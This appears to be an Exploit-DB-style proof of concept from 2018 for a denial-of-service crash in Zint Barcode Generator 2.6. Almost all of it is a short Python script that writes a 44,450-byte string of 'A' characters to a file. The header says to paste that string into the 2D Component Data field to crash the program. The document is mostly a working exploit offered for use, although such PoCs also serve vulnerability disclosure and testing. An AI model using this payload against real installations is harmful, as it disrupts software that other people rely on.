# Exploit Title: Zint Barcode Generator 2.6 - Denial of Service (PoC)
# Dork: N/A
# Date: 2018-11-01
# Exploit Author: Ihsan Sencan
# Vendor Homepage: http://www.zint.org.uk
# Software Link: https://sourceforge.net/projects/zint/files/latest/download
# Version: 2.6
# Category: Dos
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A

# POC: 
# 1)
# Add 2D Component / 2D Component Data

#!/usr/bin/python
    
buffer = "A" * 44450
 
payload = buffer
try:
    f=open("exp.txt","w")
    print "[+] Creating %s bytes evil payload." %len(payload)
    f.write(payload)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created."